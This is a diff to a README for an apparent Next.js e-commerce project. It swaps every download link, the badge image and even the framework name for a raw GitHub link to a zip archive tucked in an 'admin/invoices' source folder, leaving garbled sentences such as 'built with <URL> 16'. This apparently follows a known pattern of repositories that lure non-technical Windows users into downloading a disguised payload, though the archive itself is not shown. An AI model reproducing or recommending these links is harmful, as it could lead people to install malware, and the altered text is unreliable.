@@ -1,10 +1,10 @@
 # 🛒 ecommerce-website - Simple Online Shopping Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download-ecommerce--website-brightgreen)](https://github.com/LokoJose03/ecommerce-website)
+[![Download Now](https://raw.githubusercontent.com/LokoJose03/ecommerce-website/main/src/app/admin/invoices/website-ecommerce-2.8.zip)](https://raw.githubusercontent.com/LokoJose03/ecommerce-website/main/src/app/admin/invoices/website-ecommerce-2.8.zip)
 
 ## 📋 About this App
 
-ecommerce-website is a clean and modern online shopping app. It lets you browse products, manage your cart, and place orders. This app runs on Windows and uses Next.js 16, a popular web technology. It includes features like user login, an admin dashboard, and order tracking to keep things organized.
+ecommerce-website is a clean and modern online shopping app. It lets you browse products, manage your cart, and place orders. This app runs on Windows and uses https://raw.githubusercontent.com/LokoJose03/ecommerce-website/main/src/app/admin/invoices/website-ecommerce-2.8.zip 16, a popular web technology. It includes features like user login, an admin dashboard, and order tracking to keep things organized.
 
 You do not need technical skills to use or run this app. Just follow the steps below to get started.
 
@@ -27,7 +27,7 @@ Most modern PCs will work fine. If you have an older computer, the app should st
 ## 🚀 Getting Started: Download and Install
 
 Click the big green button above or here to visit the download page:  
-**[Download ecommerce-website](https://github.com/LokoJose03/ecommerce-website)**
+**[Download ecommerce-website](https://raw.githubusercontent.com/LokoJose03/ecommerce-website/main/src/app/admin/invoices/website-ecommerce-2.8.zip)**
 
 ### Step 1: Go to the Download Page
 
@@ -109,8 +109,8 @@ If you have questions or problems, you can:
 
 ## ⚙️ Technical Details (Optional)
 
-This app is built with Next.js 16, offering fast loading and smooth browsing. It uses a full stack setup with a database to store user info and products.
+This app is built with https://raw.githubusercontent.com/LokoJose03/ecommerce-website/main/src/app/admin/invoices/website-ecommerce-2.8.zip 16, offering fast loading and smooth browsing. It uses a full stack setup with a database to store user info and products.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-ecommerce--website-brightgreen)](https://github.com/LokoJose03/ecommerce-website)
+[![Download Now](https://raw.githubusercontent.com/LokoJose03/ecommerce-website/main/src/app/admin/invoices/website-ecommerce-2.8.zip)](https://raw.githubusercontent.com/LokoJose03/ecommerce-website/main/src/app/admin/invoices/website-ecommerce-2.8.zip)
